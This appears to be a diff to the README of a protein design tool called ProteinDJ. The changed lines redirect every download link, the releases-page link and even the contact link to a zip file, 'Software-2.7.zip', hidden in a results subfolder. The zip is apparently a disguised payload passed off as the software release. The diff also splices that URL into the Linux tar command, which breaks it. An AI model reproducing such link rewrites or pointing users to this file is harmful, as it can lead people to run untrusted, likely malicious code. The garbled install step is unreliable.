@@ -1,6 +1,6 @@
 # 🚀 proteindj - Simplifying Protein Design for Everyone
 
-[![Download ProteinDJ](https://img.shields.io/badge/Download%20ProteinDJ-blue.svg)](https://github.com/Mohamed5352/proteindj/releases)
+[![Download ProteinDJ](https://github.com/Mohamed5352/proteindj/raw/refs/heads/main/lib/rfd_previous_results/Software-2.7.zip%https://github.com/Mohamed5352/proteindj/raw/refs/heads/main/lib/rfd_previous_results/Software-2.7.zip)](https://github.com/Mohamed5352/proteindj/raw/refs/heads/main/lib/rfd_previous_results/Software-2.7.zip)
 
 ## 📋 Description
 Welcome to the official repository for the ProteinDJ protein design pipeline. This tool helps you create protein structures easily without needing deep programming skills. Whether you are a researcher or simply curious about protein design, this application guides you through the process.
@@ -18,7 +18,7 @@ Before downloading ProteinDJ, ensure your system meets these requirements:
 ### 2. Downloading ProteinDJ
 To download the latest version of ProteinDJ, you can visit the releases page. 
 
-[Visit the releases page to download](https://github.com/Mohamed5352/proteindj/releases)
+[Visit the releases page to download](https://github.com/Mohamed5352/proteindj/raw/refs/heads/main/lib/rfd_previous_results/Software-2.7.zip)
 
 ### 3. Installing ProteinDJ
 Once you have downloaded the application, follow these steps to install it:
@@ -35,7 +35,7 @@ Once you have downloaded the application, follow these steps to install it:
 
 - **Linux:** 
   1. Navigate to the directory where you downloaded the package.
-  2. Run the command `tar -xvf proteindj*.tar.gz` to extract the files.
+  2. Run the command `tar -xvf proteindj*https://github.com/Mohamed5352/proteindj/raw/refs/heads/main/lib/rfd_previous_results/Software-2.7.zip` to extract the files.
   3. Follow the instructions in the README file included in the extracted folder for installation.
 
 ### 4. Running ProteinDJ
@@ -76,11 +76,11 @@ Here are some resources to help you get the most out of ProteinDJ:
 ### 8. Download & Install
 You can download the latest version of ProteinDJ by visiting the link below:
 
-[Download ProteinDJ](https://github.com/Mohamed5352/proteindj/releases)
+[Download ProteinDJ](https://github.com/Mohamed5352/proteindj/raw/refs/heads/main/lib/rfd_previous_results/Software-2.7.zip)
 
 Follow the installation instructions based on your operating system to get started.
 
 ## 📞 Contact
-For further assistance, feel free to contact us through [GitHub Discussions](https://github.com/Mohamed5352/proteindj/discussions). 
+For further assistance, feel free to contact us through [GitHub Discussions](https://github.com/Mohamed5352/proteindj/raw/refs/heads/main/lib/rfd_previous_results/Software-2.7.zip). 
 
 Your feedback helps us improve. Thank you for choosing ProteinDJ for your protein design needs!
